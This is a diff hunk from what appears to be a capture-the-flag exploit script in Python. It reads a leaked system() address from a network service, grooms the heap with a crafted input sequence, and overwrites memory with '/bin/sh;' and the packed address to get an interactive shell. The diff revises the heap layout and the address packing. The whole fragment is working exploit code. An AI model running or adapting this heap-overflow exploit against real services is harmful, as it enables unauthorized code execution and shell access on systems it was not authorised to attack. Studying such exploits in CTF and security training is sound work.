@@ -5,13 +5,25 @@ sock.recvuntil('need: ')
 system_addr = int(sock.recvline().rstrip()[:-1], 16)
 print('[+] system addr: ' + hex(system_addr))
 binsh = '/bin/sh;'
-heap_layout = ('1\n1\n1\n1\n' +
-               '3\n0\n' +
-               '1\n1\n1\n1\n' +
-               '1\n2\n2\n2\n')
+heap_layout = \
+'''1
+AAAAAAAAAAAAAAA
+20
+0
+3
+0
+1
+
+20
+0
+1
+
+20
+0
+'''
 payload = (heap_layout +
            '4\n0\n' +
-           'g' * 32 + binsh + ' ' * 16 + p64(system_addr)[:5] + '\x7f' + '\n'
+           'g' * 32 + binsh + ' ' * 16 + p64(system_addr)[:6] + '\n'
            '5\n1\n')
 sock.sendline(payload)
 sock.interactive()
